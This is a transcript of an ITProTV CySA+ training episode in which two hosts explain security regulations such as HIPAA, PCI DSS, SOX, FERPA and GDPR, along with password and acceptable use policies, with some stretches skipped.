00:30:29.690\nSo we're gonna call it a day.\n\n684\n00:30:29.690 --> 00:30:30.370\nThanks for watching.\n\n685\n00:30:30.370 --> 00:30:31.510\nSigning off for ITProTV,\n\n686\n00:30:31.510 --> 00:30:33.260\nI've been your host Daniel Lowrie.\n&gt;&gt;

You're watching ITProTV.\n&gt;&gt; Hello,\n\n5\n00:00:12.476 --> 00:00:15.403\nwelcome to another exciting\nepisode here at ITProTV.\n\n6\n00:00:15.403 --> 00:00:16.710\nI'm your host, Mike Rodrick.\n\n7\n00:00:16.710 --> 00:00:18.950\nToday we're doing our CySA plus,\n\n8\n00:00:18.950 --> 00:00:24.060\nand in this episode we'll be taking a look\nat policies, controls and procedures.\n\n9\n00:00:24.060 --> 00:00:26.750\nAnd here to walk us through all of that\nis none other than Mr Daniel Lowrie.\n\n10\n00:00:26.750 --> 00:00:28.030\nWelcome Daniel.\n&gt;&gt; Hey Mike, thanks for\n\n11\n00:00:28.030 --> 00:00:28.980\nhaving me back on the show.\n\n12\n00:00:28.980 --> 00:00:30.620\nAlways a pleasure to be here and\n\n13\n00:00:30.620 --> 00:00:36.420\nhopefully you guys feel the same way as we\ndive back in to the CYSA Plus material.\n\n14\n00:00:36.420 --> 00:00:39.130\nI will go ahead and warn you or,\n\n15\n00:00:39.130 --> 00:00:44.040\nI will advise you that if you're having\na horrible bout of insomnia then the cure\n\n16\n00:00:44.040 --> 00:00:46.350\nthat has come to your doorstep today.\n&gt;&gt; [LAUGH]\n\n17\n00:00:46.350 --> 00:00:48.800\n&gt;&gt; Because today is about controls and\n\n18\n00:00:48.800 --> 00:00:53.160\npolicies and procedures which\nisn't the most exciting material.\n\n19\n00:00:53.160 --> 00:00:56.420\nMike and I are gonna do our best\nto spice it up for you [LAUGH].\n\n20\n00:00:56.420 --> 00:00:59.580\nBut it's all theories and\ndefinitions and things like that.\n\n21\n00:00:59.580 --> 00:01:01.490\nNot a lot of show in\nthe show unfortunately.\n\n22\n00:01:01.490 --> 00:01:05.300\nSo I just wanna go ahead and again, warn\nyou that that's what this is gonna be.\n\n23\n00:01:05.300 --> 00:01:09.866\nBut this is important information that\nyou do need to know for the exam itself.\n\n24\n00:01:09.866 --> 00:01:13.950\nSo grab some No-Doz and\npound some lattes and\n\n25\n00:01:13.950 --> 00:01:17.370\nget ready to try to dive into this stuff.\n\n26\n00:01:17.370 --> 00:01:20.390\nUnderstand some things definitionally,\nconceptually.\n\n27\n00:01:20.390 --> 00:01:24.240\nSo that as you get into the exam itself,\nyou're able to answer those questions that\n\n28\n00:01:24.240 --> 00:01:29.030\npertain to these three different\nlittle facets of life as it is.\n\n29\n00:01:29.030 --> 00:01:33.330\nUnfortunately, a big part of\na security practitioners life,\n\n30\n00:01:33.330 --> 00:01:36.050\nyou're gonna have to deal with this and\nwork with this and work around this.\n\n31\n00:01:36.050 --> 00:01:38.042\nUse these guidelines to create policies,\n\n32\n00:01:38.042 --> 00:01:40.640\ncontrol procedures all\nthe other good stuff.\n\n33\n00:01:40.640 --> 00:01:42.590\nSo just strap in and get ready for\n\n34\n00:01:42.590 --> 00:01:43.713\nthat ride.\n&gt;&gt; Yeah and as you said,\n\n35\n00:01:43.713 --> 00:01:45.143\nnot the most exciting stuff but again\nimportant information and you might not\n\n36\n00:01:45.143 --> 00:01:46.743\nhave to read this policies word for word\n&gt;&gt; No.\n\n37\n00:01:46.743 --> 00:01:47.980\n&gt;&gt; But you've gotta understand what\n\n38\n00:01:47.980 --> 00:01:51.039\nthey're there for.\n&gt;&gt; How I have to be as an organization,\n\n39\n00:01:51.039 --> 00:01:54.182\nhow do we maintain\ncompliance things like that.\n\n40\n00:01:54.182 --> 00:01:59.387\nSo it's important to understand\nwhat these policies put into place.\n\n41\n00:01:59.387 --> 00:02:04.334\nAnd as you said to create our own\npolicies for our organization.\n\n42\n00:02:04.334 --> 00:02:04.956\n&gt;&gt; Exactly, so\n\n43\n00:02:04.956 --> 00:02:08.521\nlet start off with just a bit of refresher\nand maybe a little bit of more of new\n\n44\n00:02:08.521 --> 00:02:10.350\ninformation there.\n&gt;&gt; But\n\n45\n00:02:10.350 --> 00:02:13.380\ntalking about regulatory controls, right?\n\n46\n00:02:13.380 --> 00:02:16.710\nRegulatory policies that\nyou have to worry about.\n\n47\n00:02:16.710 --> 00:02:20.630\nCuz you might be in one of those fields\nthat are being heavily regulated by either\n\n48\n00:02:20.630 --> 00:02:24.760\nthe government or standardizing bodies,\nthings of that nature tend to come around.\n\n49\n00:02:24.760 --> 00:02:26.230\nAnd these are the HIPAAs, right?\n\n50\n00:02:26.230 --> 00:02:27.190\nSo don't forget that one.\n\n51\n00:02:27.190 --> 00:02:27.940\nWe all love HIPAA.\n\n52\n00:02:27.940 --> 00:02:31.360\nIt's probably the one that shoots to the\nforefront of most people'e minds when you\n\n53\n00:02:31.360 --> 00:02:35.620\nsay, regulation just because it's\nbeen around for a little bit now.\n\n54\n00:02:35.620 --> 00:02:39.813\nIt's probably one of the more\nwell thought out ones and\n\n55\n00:02:39.813 --> 00:02:44.098\nused because someone steals\nyour health information,\n\n56\n00:02:44.098 --> 00:02:46.820\n[LAUGH] people get mad.\n&gt;&gt; Yeah and\n\n57\n00:02:46.820 --> 00:02:52.020\nI think we see it affecting more\npeople as a, it affects you're\n\n58\n00:02:52.020 --> 00:02:57.170\naverage person more than some of those\nothers that are more industry specific,\n\n59\n00:02:57.170 --> 00:02:59.645\nbanking industry things like that.\n&gt;&gt; Everybody has health\n\n60\n00:02:59.645 --> 00:03:00.660\ninformation.\n&gt;&gt; Right.\n\n61\n00:03:00.660 --> 00:03:01.380\n&gt;&gt; We all have to go\n\n62\n00:03:01.380 --> 00:03:02.420\nto the doctor now and again.\n\n63\n00:03:02.420 --> 00:03:05.510\nAnd we know our information is out\nthere and we worry about whether or\n\n64\n00:03:05.510 --> 00:03:06.860\nnot they are handling it correctly.\n\n65\n00:03:06.860 --> 00:03:09.086\nExactly, so just being familiar again,\n\n66\n00:03:09.086 --> 00:03:13.297\nwe've talked about this before that\nwhat HIPAA is, what it stands for right?\n\n67\n00:03:13.297 --> 00:03:16.815\nIt's the health insurance, yeah,\nHealth Insurance Portability and\n\n68\n00:03:16.815 --> 00:03:19.100\nAccountability Act, it's such a mouthful,\n\n69\n00:03:19.100 --> 00:03:21.516\nthey love the name this\nthings such crazy names.\n\n70\n00:03:21.516 --> 00:03:23.315\nBut there you go.\n\n71\n00:03:23.315 --> 00:03:24.367\nWhat's another one?\n\n72\n00:03:24.367 --> 00:03:26.860\nPCDISS, right the payment card industry.\n\n73\n00:03:26.860 --> 00:03:27.650\nThat's always a good one.\n\n74\n00:03:27.650 --> 00:03:30.609\nThe data security\nstandard is the DSS part.\n\n75\n00:03:30.609 --> 00:03:34.020\nSo you see a question or\nsomeone surveys you about,\n\n76\n00:03:34.020 --> 00:03:38.858\nhey if I needed to be compliant and\nI'm taking credit card information,\n\n77\n00:03:38.858 --> 00:03:43.250\nwhat one of these standards would\nI want to be familiar with?\n\n78\n00:03:43.250 --> 00:03:45.264\nYou could point to it's PCIDSS,\nno problem,\n\n79\n00:03:45.264 --> 00:03:47.530\nright there, that's the one you need.\n\n80\n00:03:47.530 --> 00:03:48.670\nSo be familiar with that.\n\n81\n00:03:49.700 --> 00:03:54.002\nAnother one is GLBA,\nI can never say it, yeah,\n\n82\n00:03:54.002 --> 00:03:57.496\nGramm-Leach-Bliley Act.\n&gt;&gt; [LAUGH]\n\n83\n00:03:57.496 --> 00:03:59.127\n&gt;&gt; It's a bunch of people's last names\n\n84\n00:03:59.127 --> 00:04:02.984\napparently, but just put them together and\nit becomes this tongue twister of a thing.\n\n85\n00:04:02.984 --> 00:04:06.630\nBut the GLBA,\nwhich is financial institution.\n\n86\n00:04:06.630 --> 00:04:12.880\nSo if I'm a bank or\na lending institution of some sort, I'm\n\n87\n00:04:12.880 --> 00:04:16.370\ngonna be underneath the Gramm-Leach-Bliley\nAct at least here in America.\n\n88\n00:04:16.370 --> 00:04:18.790\nI don't know if it's\na worldwide standard or not.\n\n89\n00:04:18.790 --> 00:04:22.820\nBut there you go,\nit deals with financial institutions.\n\n90\n00:04:22.820 --> 00:04:26.516\nThis could be confusing,\nI remember when I first got into this,\n\n91\n00:04:26.516 --> 00:04:28.166\nit confused me a little bit.\n\n92\n00:04:28.166 --> 00:04:32.340\nCuz I thought they're both financial\ninstitutions and it's not true.\n\n93\n00:04:32.340 --> 00:04:34.110\nSOX Oxley, right?\n\n94\n00:04:34.110 --> 00:04:35.130\nSarbanes Oxley.\n\n95\n00:04:35.130 --> 00:04:39.490\nThis is the SOX, the thing S-O-X,\nlarge capital letters.\n\n96\n00:04:41.240 --> 00:04:47.130\nThis is, you have publicly\ntraded entities in the world.\n\n97\n00:04:47.130 --> 00:04:52.360\nAnd sometimes people that run those things\n&gt;&gt; [LAUGH]\n\n98\n00:04:52.360 --> 00:04:55.420\n&gt;&gt; Aren't very forthright\n\n99\n00:04:55.420 --> 00:04:58.950\nwith their information, specifically\nif it comes to their finances.\n\n100\n00:04:58.950 --> 00:05:00.920\n&gt;&gt; Yeah, they got that creative booking.\n\n101\n00:05:00.920 --> 00:05:02.930\n&gt;&gt; Yeah, I like that, yeah.\n\n102\n00:05:02.930 --> 00:05:04.850\nWe got one book over here and\n\n103\n00:05:04.850 --> 00:05:07.690\nthen the book I turn in\nthe IRS is over here, right?\n\n104\n00:05:07.690 --> 00:05:08.490\nThat kind of thing.\n\n105\n00:05:08.490 --> 00:05:11.780\nWe saw this with Enron,\nthings of that nature,\n\n106\n00:05:11.780 --> 00:05:15.700\nwhich actually brought about\nthe Sarbanes Oxley Act.\n\n107\n00:05:15.700 --> 00:05:19.771\nSo what it is,\nis a regulatory control over\n\n108\n00:05:19.771 --> 00:05:24.690\nthe financial side of\npublicly traded entities.\n\n109\n00:05:24.690 --> 00:05:26.690\nSo making sure that their\nbooks aren't being cooked.\n\n110\n00:05:26.690 --> 00:05:28.020\nEverything's on the up and up.\n\n111\n00:05:28.020 --> 00:05:31.840\nBut inside of that is also computer\nsecurity criteria as well,\n\n112\n00:05:31.840 --> 00:05:35.080\nbecause that goes along with\nkeeping those records secure.\n\n113\n00:05:35.080 --> 00:05:37.830\nKeeping them available, confidential.\n\n114\n00:05:37.830 --> 00:05:40.610\nTheir integrity is good and all that.\n&gt;&gt; How long you have to keep them.\n\n115\n00:05:40.610 --> 00:05:41.242\n&gt;&gt; Exactly.\n\n116\n00:05:41.242 --> 00:05:41.940\n&gt;&gt; I know there's\n\n117\n00:05:41.940 --> 00:05:45.105\ndeals with laptops from those C\nlevel execs, emails for example, and\n\n118\n00:05:45.105 --> 00:05:49.920\nhow long you have to retain those records.\n&gt;&gt; Exactly, so, if again,\n\n119\n00:05:49.920 --> 00:05:54.520\nyou need to answer questions on financial\nor publicly traded entities and\n\n120\n00:05:54.520 --> 00:05:57.520\ntheir financial status with\ntheir computer security,\n\n121\n00:05:57.520 --> 00:06:01.690\nthat's gonna be the Sarbanes Oxley or\njust SOX as most people call it.\n\n122\n00:06:03.200 --> 00:06:04.230\nFERPA is another one.\n\n123\n00:06:04.230 --> 00:06:07.465\nThe Family Educational Rights and\nPrivacy Act.\n\n124\n00:06:07.465 --> 00:06:10.940\nIt's kind of a HIPAA of\nyour educational records.\n\n125\n00:06:10.940 --> 00:06:13.560\nSo, if you go to public education forum or\n\n126\n00:06:13.560 --> 00:06:18.340\nprivate education forum and\nyou are student there of some sorts.\n\n127\n00:06:18.340 --> 00:06:21.220\nWell, they are taking information\nabout your personal identity,\n\n128\n00:06:21.220 --> 00:06:23.190\na PII is there, right?\n\n129\n00:06:23.190 --> 00:06:27.410\nThe personally identifiable information\nis going to be in their system somehow.\n\n130\n00:06:27.410 --> 00:06:31.720\nAnd they need to keep that stuff secure,\nbecause we've all seen numerous,\n\n131\n00:06:31.720 --> 00:06:34.670\nnumerous times, that is sensitive\ninformation that people can\n\n132\n00:06:34.670 --> 00:06:39.110\nuse to leverage identity theft,\ncredit fraud, all that othergood stuff.\n\n133\n00:06:39.110 --> 00:06:42.550\nSo there are regulations inside of keeping\n\n134\n00:06:42.550 --> 00:06:45.420\ntheir information secure\nis gonna be in FERPA.\n\n135\n00:06:45.420 --> 00:06:49.450\nAll right, and then, I threw GDPR on top\nof the pile just because as of two days\n\n136\n00:06:49.450 --> 00:06:52.340\nago, yeah a couple of days ago,\n&gt;&gt; Yeah, a few days ago.\n\n137\n00:06:52.340 --> 00:06:53.996\n&gt;&gt; I think four days ago or\n\n138\n00:06:53.996 --> 00:06:58.535\nsomething like that,\nas the filming of this episode anyway.\n\n139\n00:06:58.535 --> 00:07:03.603\nGDPR is a big one and that is\nthe General Data Protection Regulation.\n\n140\n00:07:03.603 --> 00:07:06.049\nYes, General Data Protecton Regulation.\n\n141\n00:07:06.049 --> 00:07:08.034\nSo it's European customers.\n\n142\n00:07:08.034 --> 00:07:13.802\nIf you have European customers or if you\nare in Europe, then this applies to you.\n\n143\n00:07:13.802 --> 00:07:18.428\nAnd it's just on how to keep data\ngenerally protected and secure and\n\n144\n00:07:18.428 --> 00:07:20.062\ndefining what data is.\n\n145\n00:07:20.062 --> 00:07:24.586\nWhat data owner is, data retention\npolicies all those goes inside of there.\n\n146\n00:07:24.586 --> 00:07:29.209\nSo if you wanted to use or as a framework,\nyou could probably pull these down, say,\n\n147\n00:07:29.209 --> 00:07:33.330\nhey, well they've already kinda\ndone the heavy lifting for me.\n\n148\n00:07:33.330 --> 00:07:38.980\nI'll borrow from them or I'm in a health\ninsurance field, I'm in the health field.\n\n149\n00:07:38.980 --> 00:07:44.140\nI'm in educational arena,\nI'm going to need to follow this.\n\n150\n00:07:44.140 --> 00:07:48.690\nSo these again, just a quick run down\nof kind of stuff we've all ready kinda\n\n151\n00:07:48.690 --> 00:07:52.116\nlearned, but maybe a little more to it.\n&gt;&gt; And I like the way you framed it Danny.\n\n152\n00:07:52.116 --> 00:07:53.766\nBecause really on this exam,\n\n153\n00:07:53.766 --> 00:07:58.320\nthey're not gonna expect you to memorize\nSarbanes Oxley or anything like that but\n\n154\n00:07:58.320 --> 00:08:02.215\nwhat they might ask you is, hey,\nyou're an educational facility And\n\n155\n00:08:02.215 --> 00:08:06.660\nyou take credit card payments, which of\nthese regulations would apply to you?\n\n156\n00:08:06.660 --> 00:08:08.269\nAnd you're gonna say there's Ferpa.\n\n157\n00:08:08.269 --> 00:08:12.492\nIt probably applies to me or\nwould apply in this situation because\n\n158\n00:08:12.492 --> 00:08:15.574\nwe've got that PII that\ndeals with education.\n\n159\n00:08:15.574 --> 00:08:18.565\nAnd since we take credit card payments for\n\n160\n00:08:18.565 --> 00:08:22.329\nthese classes,\nwe also have to worry about PCI DSS.\n\n161\n00:08:22.329 --> 00:08:26.821\nSo understanding which regulations might\nbe in play depending on the business,\n\n162\n00:08:26.821 --> 00:08:30.055\nthat would be a very good test question.\n&gt;&gt; I totally agree.\n\n163\n00:08:30.055 --> 00:08:34.849\nThat's exactly how you'll see stuff just\nlike this, so knowing each one of these is\n\n164\n00:08:34.849 --> 00:08:39.237\ndifferent regulatory standards that\nyou have out there, will help you, and\n\n165\n00:08:39.237 --> 00:08:41.783\naid you in answering questions.\n&gt;&gt; All right, so\n\n166\n00:08:41.783 --> 00:08:45.579\nDaniel, we've got these regulations that\nother smart people have put together and\n\n167\n00:08:45.579 --> 00:08:47.838\nsaid we have to follow if\nwe're in this industry.\n\n168\n00:08:47.838 --> 00:08:51.825\nBut as an organization, we might also have\nour own rules and requirements that we put\n\n169\n00:08:51.825 --> 00:08:55.781\ninto place, right?\n&gt;&gt; That is exactly right, Mike, we are not\n\n170\n00:08:55.781 --> 00:08:59.171\na slave to the man above us, right?\n&gt;&gt; [LAUGH]\n\n171\n00:08:59.171 --> 00:09:00.786\n&gt;&gt; We are our own men, or one,\n\n172\n00:09:00.786 --> 00:09:05.158\nthat's fine, that's what it is and\nwe do things our way, which is cool.\n\n173\n00:09:05.158 --> 00:09:05.788\n&gt;&gt; Well, I like it,\n\n174\n00:09:05.788 --> 00:09:06.889\nI have a little bit of freedom.\n\n175\n00:09:06.889 --> 00:09:11.147\nWe got some wiggle room to do it the way\nwe think should be the right way to do it.\n\n176\n00:09:11.147 --> 00:09:14.742\nBut we do need to create policies.\n\n177\n00:09:14.742 --> 00:09:18.057\nAnd it's an important thing to\nunderstand what a policy is,\n\n178\n00:09:18.057 --> 00:09:20.600\na policy is something\nthat must be adhered to.\n\n179\n00:09:20.600 --> 00:09:26.640\nThis is to quote Jordan McKnight,\nwhatever the name was,\n\n180\n00:09:26.640 --> 00:09:29.606\nthis is how we do it.\n&gt;&gt; [LAUGH]\n\n181\n00:09:29.606 --> 00:09:32.123\n&gt;&gt; Right, the 90s rap song.\n\n182\n00:09:32.123 --> 00:09:35.235\nThis is exactly how we reign that out and\n\n183\n00:09:35.235 --> 00:09:39.020\nyou follow this procedure it is a must,\nright?\n\n184\n00:09:39.020 --> 00:09:42.940\nSo but before we can say, Mike,\nyou must follow this procedure,\n\n185\n00:09:42.940 --> 00:09:47.313\nwe have to lay that procedure out,\nor I keep saying procedure, policy.\n\n186\n00:09:47.313 --> 00:09:50.818\nCuz policies and procedures are different\nthings, I don't wanna get them confused,\n\n187\n00:09:50.818 --> 00:09:51.979\nI don't wanna confuse you.\n\n188\n00:09:51.979 --> 00:09:55.967\nWe've gotta lay that policy out so Mike\nknows what he's supposed to be doing, or\n\n189\n00:09:55.967 --> 00:09:58.266\nhow he's supposed to be doing things,\nokay?\n\n190\n00:09:58.266 --> 00:10:03.230\nSo in a policy, where basically it\ndefines just again those rules that\n\n191\n00:10:03.230 --> 00:10:08.122\nmust be followed, these are things\nlike password prompts, right?\n\n192\n00:10:08.122 --> 00:10:13.504\nWhen I create a password, what rules\nmust I follow to create that password?\n\n193\n00:10:13.504 --> 00:10:17.486\nProbably everybody here\nas been down that road.\n\n194\n00:10:17.486 --> 00:10:21.292\nI remember working workstation support,\nthis was probably the biggest bone of\n\n195\n00:10:21.292 --> 00:10:23.690\ncontention for\njust every one of my users, Mike.\n\n196\n00:10:23.690 --> 00:10:25.930\nI'm sure you've encountered\nthe exact same thing.\n\n197\n00:10:25.930 --> 00:10:29.175\nWell, I've got a password for\nthis website and I've got a password for\n\n198\n00:10:29.175 --> 00:10:32.745\nthat website, and I've got a password for\nour login, I've got a password for\n\n199\n00:10:32.745 --> 00:10:34.820\nour mainframe access, I've got this pass.\n\n200\n00:10:34.820 --> 00:10:38.175\nI can't keep it all straight and\neverybody is different and it's true,\n\n201\n00:10:38.175 --> 00:10:39.612\nit does get a little annoying.\n\n202\n00:10:39.612 --> 00:10:44.278\nEveryone's standard can be different\nwhen it comes to their password policy.\n\n203\n00:10:44.278 --> 00:10:47.981\nSo I know that sometimes you'll run\ninto a password policy that says,\n\n204\n00:10:47.981 --> 00:10:50.431\nmust be at least eight characters long.\n\n205\n00:10:50.431 --> 00:10:53.150\nOkay, great that's an easy one, right?\n\n206\n00:10:53.150 --> 00:10:57.292\nThen you go to this XYZ company over here,\nand they say, yeah,\n\n207\n00:10:57.292 --> 00:11:02.530\nit must be at least eight characters long,\nmust have one upper case character,\n\n208\n00:11:02.530 --> 00:11:04.704\nat least, right?\n&gt;&gt; [LAUGH]\n\n209\n00:11:04.704 --> 00:11:06.264\n&gt;&gt; Okay, well you've increased\n\n210\n00:11:06.264 --> 00:11:08.246\nthe complexity on me but not too crazy.\n\n211\n00:11:08.246 --> 00:11:14.782\nInstead of gators, all lower case, I'll\nmake it capital G, Gators, something easy.\n\n212\n00:11:14.782 --> 00:11:18.923\nAnd then you see the whole idea of well,\nnow you have to have one,\n\n213\n00:11:18.923 --> 00:11:23.143\nit must be eight characters long\nyou must have one uppercase, and\n\n214\n00:11:23.143 --> 00:11:28.073\none numerical value, and one special\ncharacter and the list goes on and on.\n\n215\n00:11:28.073 --> 00:11:30.399\nAnd then you start seeing\nthe length increase so\n\n216\n00:11:30.399 --> 00:11:32.447\nthese complexity rules come into place.\n\n217\n00:11:32.447 --> 00:11:37.708\nThe real idea here is the fact that\nthere are rules that you must follow,\n\n218\n00:11:37.708 --> 00:11:41.399\nbecause that is our policy\non how we do passwords.\n\n219\n00:11:41.399 --> 00:11:44.365\nWe come over those policies based on what\nwe think, it's gonna be the best practice.\n\n220\n00:11:44.365 --> 00:11:50.336\nAgain, these are our policies, we get\nto decide what is worth employing and\n\n221\n00:11:50.336 --> 00:11:55.201\nwhat is not worth employing,\ndo we need special characters?\n\n222\n00:11:55.201 --> 00:11:56.197\nI don't know maybe not,\n\n223\n00:11:56.197 --> 00:11:59.898\nmaybe if we just meant you gotta have a 30\ncharacter password, you don't need special\n\n224\n00:11:59.898 --> 00:12:03.374\ncharacters they can be all lowercase if\nyou want, but it's gotta be 30 characters.\n\n225\n00:12:03.374 --> 00:12:05.212\nOkay.\n&gt;&gt; [LAUGH]\n\n226\n00:12:05.212 --> 00:12:05.992\n&gt;&gt; That can be the thing,\n\n227\n00:12:05.992 --> 00:12:06.944\npeople are gonna hate you.\n\n228\n00:12:06.944 --> 00:12:08.749\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n229\n00:12:08.749 --> 00:12:10.165\n&gt;&gt; Cuz you're coming up with 30 character,\n\n230\n00:12:10.165 --> 00:12:12.162\neven pass phrases would be a little\nbit difficult at that point\n\n231\n00:12:12.162 --> 00:12:12.920\n&gt;&gt; [LAUGH]\n\n232\n00:12:12.920 --> 00:12:15.145\n&gt;&gt; But, that could be your policy.\n\n233\n00:12:15.145 --> 00:12:19.352\nSo password policies, another one\nwould be acceptable use policies,\n\n234\n00:12:19.352 --> 00:12:22.378\nwhat am I allowed to do,\nwhat am I not allowed to do?\n\n235\n00:12:22.378 --> 00:12:26.775\nYou typically see all the stuff\nbased in employee handbooks-\n\n236\n00:12:26.775 --> 00:12:27.366\n&gt;&gt; Yeah.\n\n237\n00:12:27.366 --> 00:12:28.039\n&gt;&gt; And stuff.\n\n238\n00:12:28.039 --> 00:12:29.824\n&gt;&gt; Yeah, you're basically laying out what\n\n239\n00:12:29.824 --> 00:12:32.527\nit is you expect, cuz remember\neverybody is part of security,\n\n240\n00:12:32.527 --> 00:12:34.924\nthat means you're end users,\nthe one's that are using\n\n241\n00:12:34.924 --> 00:12:38.092\nyour systems working with your data,\nthey're part of security as well.\n\n242\n00:12:38.092 --> 00:12:42.544\nAnd we leave a lot of decisions in the end\nusers hands, like, creating passwords for\n\n243\n00:12:42.544 --> 00:12:43.120\nexample.\n\n244\n00:12:43.120 --> 00:12:48.193\nAnd we let them create their own password,\nbut if we just stop there, how many people\n\n245\n00:12:48.193 --> 00:12:51.729\nwould have a single character password?\n&gt;&gt; [LAUGH]\n\n246\n00:12:51.729 --> 00:12:53.301\n&gt;&gt; The letter K is my password.\n\n247\n00:12:53.301 --> 00:12:54.542\n&gt;&gt; I'm gonna go like 98% of users.\n\n248\n00:12:54.542 --> 00:12:56.176\n[LAUGH]\n&gt;&gt; Exactly, so\n\n249\n00:12:56.176 --> 00:12:58.908\nwe have to have these policies\nin place that define.\n\n250\n00:12:58.908 --> 00:13:02.634\nYou can't just say, hey, we expect you\nto create a strong password, right?\n\n251\n00:13:02.634 --> 00:13:04.539\nWe have to define,\nwell what is a strong password?\n\n252\n00:13:04.539 --> 00:13:06.779\nThe word strong is\nsomewhere in my password.\n\n253\n00:13:06.779 --> 00:13:07.341\n&gt;&gt; Yeah.\n\n254\n00:13:07.341 --> 00:13:08.963\n&gt;&gt; Or is it, what is that?\n\n255\n00:13:08.963 --> 00:13:10.194\n&gt;&gt; And people get cube.\n\n256\n00:13:10.194 --> 00:13:11.616\n[LAUGH]\n&gt;&gt; They really do.\n\n257\n00:13:11.616 --> 00:13:14.480\nSo by having policies in place,\nwe can define what it is we expect and\n\n258\n00:13:14.480 --> 00:13:15.802\neverybody is on the same page.\n\n259\n00:13:15.802 --> 00:13:20.513\nThere is no question about, hey, well,\nI thought a four-character password was\n\n260\n00:13:20.513 --> 00:13:24.078\nstrong enough as long as I had\na special character in there, and\n\n261\n00:13:24.078 --> 00:13:25.914\nit's all defined in policies.\n\n262\n00:13:25.914 --> 00:13:26.946\nThis is how we tell our end-users\nwhat we expect out of them-\n\n263\n00:13:26.946 --> 00:13:27.502\n&gt;&gt; Exactly.\n\n264\n00:13:27.502 --> 00:13:28.154\n&gt;&gt; As far as security goes.\n\n265\n00:13:28.154 --> 00:13:29.051\n&gt;&gt; Exactly right.\n\n266\n00:13:29.051 --> 00:13:32.946\nAnd then the acceptable\nuses also in the realm of,\n\n267\n00:13:32.946 --> 00:13:37.414\nwhen I'm engaged in using\ncompany IT services, right?\n\n268\n00:13:37.414 --> 00:13:40.844\nAm I allowed to get on\nFacebook during my lunch hour?\n\n269\n00:13:40.844 --> 00:13:43.407\nI don't know, I have to look at\nthe acceptable use policy and\n\n270\n00:13:43.407 --> 00:13:44.369\nsee what's in there.\n\n271\n00:13:44.369 --> 00:13:46.574\nMaybe I am, maybe I'm not.\n\n272\n00:13:46.574 --> 00:13:51.231\nI need to have an acceptable use policy so\nthat the employee knows or\n\n273\n00:13:51.231 --> 00:13:54.652\nthe user knows what is okay and\nwhat's not okay.\n\n274\n00:13:54.652 --> 00:13:58.940\nSo if any kind of sanctions are brought\nupon them, they understand why that\n\n275\n00:13:58.940 --> 00:14:02.632\noccur and all that is gonna be\nlaid out in acceptable use policy.\n\n276\n00:14:02.632 --> 00:14:04.375\n&gt;&gt; I thought that was perfectly fine,\n\n277\n00:14:04.375 --> 00:14:07.290\nI'm at work, I've got a nice\nbig fat hype to the Internet.\n\n278\n00:14:07.290 --> 00:14:07.835\n&gt;&gt; Yeah.\n\n279\n00:14:07.835 --> 00:14:08.796\n&gt;&gt; Lots of storage,\n\n280\n00:14:08.796 --> 00:14:10.852\nwhy shouldn't I be able to download.\n\n281\n00:14:10.852 --> 00:14:12.675\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n282\n00:14:12.675 --> 00:14:13.648\n&gt;&gt; It's not in our policy.\n\n283\n00:14:13.648 --> 00:14:15.028\n&gt;&gt; Yeah, if it was wrong,\n\n284\n00:14:15.028 --> 00:14:18.479\nthey would block me from getting there,\nbut you know what?\n\n285\n00:14:18.479 --> 00:14:23.794\nThat maybe something that you make\na policy where we block websites that\n\n286\n00:14:23.794 --> 00:14:29.209\nwe don't want our users to go to during\nX hours or at all, it's up to you.\n\n287\n00:14:29.209 --> 00:14:33.595\nAll right, so black and\nwhite listing of activities just again\n\n288\n00:14:33.595 --> 00:14:37.664\nInternet use content maybe email even,\nthe use of email.\n\n289\n00:14:37.664 --> 00:14:40.312\nAm I allowed to send to, hey,\nsend Mike a friendly email?\n\n290\n00:14:40.312 --> 00:14:42.844\nHey, you're invited to my birthday party,\ncome on over.\n\n291\n00:14:42.844 --> 00:14:44.941\nThat might not be acceptable use?\n\n292\n00:14:44.941 --> 00:14:46.293\nSo we got to define these things out.\n\n293\n00:14:46.293 --> 00:14:48.710\nI think copyrighted material\nkinda hinted at that.\n\n294\n00:14:48.710 --> 00:14:50.869\nThe piracy issue is a big deal.\n\n295\n00:14:50.869 --> 00:14:53.708\nWe've dealt with that, I've dealt\nwith that, Mike's dealt with that.\n\n296\n00:14:53.708 --> 00:14:58.250\nYeah, it's really tempting to go out there\nand slapping a movie during work hours.\n\n297\n00:14:58.250 --> 00:15:02.779\nBut if you wanna engage in illegal\nactivity, let's call a spade a spade.\n\n298\n00:15:02.779 --> 00:15:03.975\nDo it on your own time.\n\n299\n00:15:03.975 --> 00:15:06.179\nDon't do it with my stuff\nbecause I'm culpable, right?\n\n300\n00:15:06.179 --> 00:15:06.755\n&gt;&gt;

Right.\n\n304\n00:15:12.057 --> 00:15:14.058\n&gt;&gt; Cuz I remember an organization Worked\n\n305\n00:15:14.058 --> 00:15:15.127\nat not too long ago.\n\n306\n00:15:15.127 --> 00:15:19.657\nWe got a cease and desist letter,\nit turns out one of our students was\n\n307\n00:15:19.657 --> 00:15:23.410\ndownloading illegal copies\nof copyrighted material.\n\n308\n00:15:23.410 --> 00:15:25.394\nHe didn't get the letter though.\n&gt;&gt;

[LAUGH]\n\n342\n00:16:32.997 --> 00:16:35.368\n&gt;&gt; He's been caught doing this, that, and\n\n343\n00:16:35.368 --> 00:16:37.952\nthe other, he's a real weirdo, who knows?\n\n344\n00:16:37.952 --> 00:16:44.550\nThat's typically stuff that we don't want,\n[LAUGH] our users to look at.\n\n345\n00:16:44.550 --> 00:16:48.264\nBut they might be out there actively\ntrying to bypass the security\n\n346\n00:16:48.264 --> 00:16:52.314\ncontrols that we put up so we can tell\nthem in the acceptable use policy,\n\n347\n00:16:52.314 --> 00:16:54.833\ndon't even try to get around them, right?\n\n348\n00:16:54.833 --> 00:16:58.066\nIt's one thing if you just kind\nof fall backwards into, okay,\n\n349\n00:16:58.066 --> 00:17:00.418\nwe didn't show up,\nthat's a different story.\n\n350\n00:17:00.418 --> 00:17:03.572\nBut if you're actively trying to work\nyour way around security controls, and\n\n351\n00:17:03.572 --> 00:17:06.317\nwe discover this, this could be\ngrounds for termination, right?\n\n352\n00:17:06.317 --> 00:17:08.322\nSo you gotta put that in there.\n&gt;&gt; Honestly,\n\n353\n00:17:08.322 --> 00:17:10.498\nit is mind-boggling sometimes-\n&gt;&gt; [COUGH]\n\n354\n00:17:10.498 --> 00:17:13.739\n&gt;&gt; You've got end users that have trouble.\n\n355\n00:17:13.739 --> 00:17:16.265\nYou call them up and\nyou want them to reboot their machine, and\n\n356\n00:17:16.265 --> 00:17:18.575\nthey turn the monitor on and off, right?\n&gt;&gt; Yeah.\n\n357\n00:17:18.575 --> 00:17:20.218\n&gt;&gt; Yet 